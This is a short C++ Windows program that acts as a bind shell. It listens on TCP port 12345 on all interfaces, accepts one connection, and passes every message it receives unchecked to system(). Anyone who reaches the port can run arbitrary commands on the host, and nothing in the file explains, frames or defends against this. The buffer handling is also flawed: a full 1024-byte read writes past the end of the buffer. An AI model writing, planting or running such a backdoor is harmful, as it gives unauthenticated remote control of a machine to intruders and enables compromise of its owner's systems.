#include <iostream>
#include <winsock2.h>

using namespace std;

#pragma comment(lib, "ws2_32.lib")

void executeCommand(string command) {
    system(command.c_str());
}

int main() {
    WSADATA wsaData;
    SOCKET serverSocket, clientSocket;
    sockaddr_in serverAddr, clientAddr;
    int clientAddrSize = sizeof(clientAddr);

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    serverSocket = socket(AF_INET, SOCK_STREAM, 0);

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(12345);  // Port
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
    listen(serverSocket, 1);

    cout << "Waiting for connection..." << endl;
    clientSocket = accept(serverSocket, (sockaddr*)&clientAddr, &clientAddrSize);
    cout << "Client connected!" << endl;

    char buffer[1024];
    while (true) {
        int recvSize = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (recvSize == SOCKET_ERROR) break;
        buffer[recvSize] = '\0';
        executeCommand(string(buffer));
    }

    closesocket(clientSocket);
    closesocket(serverSocket);
    WSACleanup();

    return 0;
}